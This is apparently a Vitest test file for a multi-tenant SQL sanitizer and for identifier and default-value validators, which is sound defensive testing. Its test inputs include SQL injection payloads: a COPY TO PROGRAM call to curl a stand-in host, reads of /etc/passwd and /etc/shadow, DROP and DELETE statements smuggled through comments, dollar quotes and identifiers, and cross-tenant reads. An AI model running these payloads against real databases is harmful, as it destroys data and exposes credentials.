// @vitest-environment node
import { describe, it, expect } from 'vitest';
import { sanitizeSqlForTenant, quotePgIdent, isSafeDefault } from './db-browser';

const TENANT = 'p_0123456789abcdef0123456789abcdef';

describe('sanitizeSqlForTenant — allowed statements', () => {
  it('accepts a plain SELECT against the tenant schema', () => {
    expect(sanitizeSqlForTenant('SELECT * FROM users', TENANT)).toBe('SELECT * FROM users');
  });

  it('accepts a CTE', () => {
    const sql = 'WITH recent AS (SELECT id FROM orders) SELECT * FROM recent';
    expect(sanitizeSqlForTenant(sql, TENANT)).toBe(sql);
  });

  it('accepts tenant self-qualification', () => {
    const sql = `SELECT * FROM ${TENANT}.users`;
    expect(sanitizeSqlForTenant(sql, TENANT)).toBe(sql);
  });

  it('allows string literals containing SQL keywords', () => {
    // The keyword here is inside a literal, not a statement.
    const sql = "SELECT * FROM notes WHERE body = 'please DROP TABLE later'";
    expect(sanitizeSqlForTenant(sql, TENANT)).toBe(sql);
  });

  it('strips a single trailing semicolon', () => {
    expect(sanitizeSqlForTenant('SELECT 1;', TENANT)).toBe('SELECT 1');
  });
});

describe('sanitizeSqlForTenant — blocked statements', () => {
  const blocked: Array<[string, string]> = [
    ['INSERT', 'INSERT INTO users (id) VALUES (1)'],
    ['UPDATE', 'UPDATE users SET admin = true'],
    ['DELETE', 'DELETE FROM users'],
    ['DROP', 'DROP TABLE users'],
    ['ALTER', 'ALTER TABLE users ADD COLUMN x int'],
    ['TRUNCATE', 'TRUNCATE users'],
    ['GRANT', 'GRANT ALL ON users TO public'],
    ['COPY', "COPY users TO PROGRAM 'curl evil.test'"],
    ['CREATE', 'CREATE TABLE evil (id int)'],
    ['multiple statements', 'SELECT 1; DROP TABLE users'],
    ['non-SELECT leading keyword', 'VACUUM FULL'],
    ['nested write via CTE', 'WITH x AS (DELETE FROM users RETURNING *) SELECT * FROM x'],
  ];

  for (const [label, sql] of blocked) {
    it(`blocks ${label}`, () => {
      expect(sanitizeSqlForTenant(sql, TENANT)).toBeNull();
    });
  }

  it('blocks filesystem and process functions', () => {
    expect(sanitizeSqlForTenant("SELECT pg_read_file('/etc/passwd')", TENANT)).toBeNull();
    expect(sanitizeSqlForTenant("SELECT pg_read_binary_file('/etc/shadow')", TENANT)).toBeNull();
    expect(sanitizeSqlForTenant("SELECT pg_ls_dir('/')", TENANT)).toBeNull();
    expect(sanitizeSqlForTenant('SELECT pg_sleep(60)', TENANT)).toBeNull();
    expect(sanitizeSqlForTenant('SELECT pg_terminate_backend(1)', TENANT)).toBeNull();
    expect(sanitizeSqlForTenant('SELECT set_config($$x$$, $$y$$, false)', TENANT)).toBeNull();
  });

  it('blocks platform schema and catalog access', () => {
    expect(sanitizeSqlForTenant('SELECT * FROM public.users', TENANT)).toBeNull();
    expect(sanitizeSqlForTenant('SELECT * FROM information_schema.tables', TENANT)).toBeNull();
    expect(sanitizeSqlForTenant('SELECT * FROM pg_catalog.pg_tables', TENANT)).toBeNull();
    expect(sanitizeSqlForTenant('SELECT * FROM pg_shadow', TENANT)).toBeNull();
  });

  it('blocks another tenant schema (cross-tenant read)', () => {
    const otherTenant = 'p_fedcba9876543210fedcba9876543210';
    expect(sanitizeSqlForTenant(`SELECT * FROM ${otherTenant}.users`, TENANT)).toBeNull();
  });

  it('blocks cross-tenant access hidden in a quoted identifier', () => {
    expect(sanitizeSqlForTenant('SELECT * FROM "public"."api_keys"', TENANT)).toBeNull();
  });

  it('blocks cross-tenant access inside a subquery', () => {
    const sql = `SELECT * FROM users WHERE id IN (SELECT id FROM other.accounts)`;
    expect(sanitizeSqlForTenant(sql, TENANT)).toBeNull();
  });

  it('blocks cross-tenant access behind a JOIN', () => {
    const sql = `SELECT * FROM users u JOIN other.secrets s ON s.id = u.id`;
    expect(sanitizeSqlForTenant(sql, TENANT)).toBeNull();
  });

  it('blocks keyword smuggling through a comment', () => {
    // Comments are stripped before inspection, so the real statement is checked.
    expect(sanitizeSqlForTenant('SELECT 1 --\n; DROP TABLE users', TENANT)).toBeNull();
  });

  it('blocks dollar-quoted bodies that hide a second statement', () => {
    const sql = 'SELECT $tag$ ; DELETE FROM users $tag$';
    // A dollar-quoted literal is stripped, but the embedded terminator means
    // this must not be treated as a clean single SELECT either.
    const result = sanitizeSqlForTenant(sql, TENANT);
    expect(result === null || !result.includes('DELETE')).toBe(true);
  });
});

describe('quotePgIdent', () => {
  it('quotes valid identifiers', () => {
    expect(quotePgIdent('users')).toBe('"users"');
  });

  it('rejects identifiers that could break out of quoting', () => {
    expect(() => quotePgIdent('users"; DROP TABLE x; --')).toThrow(/Invalid SQL identifier/);
    expect(() => quotePgIdent('Users')).toThrow(/Invalid SQL identifier/);
    expect(() => quotePgIdent('1users')).toThrow(/Invalid SQL identifier/);
    expect(() => quotePgIdent('')).toThrow(/Invalid SQL identifier/);
    expect(() => quotePgIdent('a'.repeat(64))).toThrow(/Invalid SQL identifier/);
  });
});

describe('isSafeDefault', () => {
  it('accepts a small allowlist of defaults', () => {
    expect(isSafeDefault('NULL')).toBe(true);
    expect(isSafeDefault('true')).toBe(true);
    expect(isSafeDefault('now()')).toBe(true);
    expect(isSafeDefault('CURRENT_TIMESTAMP')).toBe(true);
    expect(isSafeDefault('42')).toBe(true);
    expect(isSafeDefault("'hello world'")).toBe(true);
  });

  it('rejects SQL smuggled through a DEFAULT expression', () => {
    expect(isSafeDefault('1); DROP TABLE users; --')).toBe(false);
    expect(isSafeDefault("pg_read_file('/etc/passwd')")).toBe(false);
    expect(isSafeDefault("'; DELETE FROM users; --")).toBe(false);
    expect(isSafeDefault('(SELECT 1)')).toBe(false);
  });
});
